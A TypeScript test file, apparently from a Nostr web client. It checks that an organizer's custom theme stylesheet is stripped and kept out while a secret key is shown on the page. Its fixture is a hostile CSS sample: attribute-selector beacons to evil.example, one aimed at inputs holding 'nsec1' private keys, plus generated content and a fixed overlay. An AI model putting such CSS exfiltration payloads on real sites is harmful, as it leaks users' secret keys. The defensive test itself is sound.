/**
 * §13.3 Option A acceptance: no `style[data-event-theme]` (nor the wash) may be
 * live while a secret is in the DOM. A hostile organizer stylesheet — broad
 * attribute selectors, fixed overlays, generated content, background beacons —
 * is injected, then a secret surface opens; the guard must synchronously strip
 * the stylesheet and refuse to re-inject it until the surface closes.
 *
 * The test env is `node` (no jsdom), so a minimal fake document models exactly
 * what the injector touches: create/append/insertBefore/remove of <style>
 * elements and `querySelector('style[data-…]')`.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";

class FakeEl {
  tagName: string;
  attrs = new Map<string, string>();
  textContent = "";
  parent: FakeEl | null = null;
  children: FakeEl[] = [];
  constructor(tag: string) {
    this.tagName = tag.toLowerCase();
  }
  setAttribute(k: string, v: string) {
    this.attrs.set(k, v);
  }
  getAttribute(k: string) {
    return this.attrs.get(k) ?? null;
  }
  appendChild(c: FakeEl) {
    c.parent = this;
    this.children.push(c);
    return c;
  }
  insertBefore(c: FakeEl, ref: FakeEl | null) {
    c.parent = this;
    const i = ref ? this.children.indexOf(ref) : -1;
    if (i < 0) this.children.push(c);
    else this.children.splice(i, 0, c);
    return c;
  }
  remove() {
    if (this.parent) {
      this.parent.children = this.parent.children.filter((x) => x !== this);
      this.parent = null;
    }
  }
  /** Recursive `tag[attr]` match (the only selector shape the injector uses). */
  query(tag: string, attr: string): FakeEl | null {
    for (const c of this.children) {
      if (c.tagName === tag && c.attrs.has(attr)) return c;
      const nested = c.query(tag, attr);
      if (nested) return nested;
    }
    return null;
  }
}

function makeFakeDocument() {
  const head = new FakeEl("head");
  const body = new FakeEl("body");
  const document = {
    head,
    body,
    createElement: (tag: string) => new FakeEl(tag),
    querySelector: (sel: string) => {
      const m = /^(\w+)\[([\w-]+)\]$/.exec(sel);
      if (!m) return null;
      return head.query(m[1]!, m[2]!) ?? body.query(m[1]!, m[2]!);
    },
  };
  return { document, head, body };
}

const HOSTILE_CSS = `
  * { }
  [class] { background: url("https://evil.example/beacon?all"); }
  input[value^="nsec1"] { background: url("https://evil.example/leak"); }
  .secret::after { content: attr(data-secret); }
  .overlay { position: fixed; inset: 0; }
`;

// Import AFTER the fake document is installed so module top-level `document`
// guards see it.
let head: FakeEl;
let body: FakeEl;
let mod: typeof import("./theme-injector.js");
let secretMod: typeof import("$lib/stores/secret-surface.svelte.js");

describe("§13.3 event theme is suppressed while a secret is in the DOM", () => {
  beforeEach(async () => {
    const fake = makeFakeDocument();
    head = fake.head;
    body = fake.body;
    vi.stubGlobal("document", fake.document);
    mod = await import("./theme-injector.js");
    secretMod = await import("$lib/stores/secret-surface.svelte.js");
    mod.clearEventTheme();
    secretMod.__resetSecretSurfaceForTests();
  });
  afterEach(() => {
    vi.unstubAllGlobals();
    vi.resetModules();
  });

  const themeStyle = () => head.query("style", "data-event-theme");

  it("strips a live hostile theme the instant a secret surface opens, and keeps it out", () => {
    // A hostile organizer theme is live on the event route.
    mod.previewEventTheme("naddr1abc", HOSTILE_CSS);
    expect(themeStyle()).not.toBeNull();

    // A secret lands in the DOM and the surface opens.
    const secret = new FakeEl("div");
    secret.setAttribute("data-secret", "nsec1thesecretkey");
    body.appendChild(secret);
    const exit = secretMod.enterSecretSurface();

    // No event stylesheet may be live while the secret exists.
    expect(mod.isEventThemeSuppressed()).toBe(true);
    expect(themeStyle()).toBeNull();
    expect(body.query("div", "data-secret")).not.toBeNull(); // secret still present

    // Any re-injection attempt while suppressed is a no-op (late theme fetch,
    // route re-sync, wash).
    mod.previewEventTheme("naddr1abc", HOSTILE_CSS);
    void mod.syncEventTheme("naddr1abc");
    mod.syncEventWash("31923:pub:d");
    expect(themeStyle()).toBeNull();
    expect(head.query("style", "data-event-wash")).toBeNull();

    // Closing the surface lifts the suppression.
    exit();
    expect(mod.isEventThemeSuppressed()).toBe(false);
  });

  it("refcounts nested secret surfaces — theme stays suppressed until the LAST closes", () => {
    mod.previewEventTheme("naddr1abc", HOSTILE_CSS);
    const exitA = secretMod.enterSecretSurface();
    const exitB = secretMod.enterSecretSurface();
    expect(mod.isEventThemeSuppressed()).toBe(true);

    exitA();
    expect(mod.isEventThemeSuppressed()).toBe(true); // B still open
    exitB();
    expect(mod.isEventThemeSuppressed()).toBe(false);
  });
});
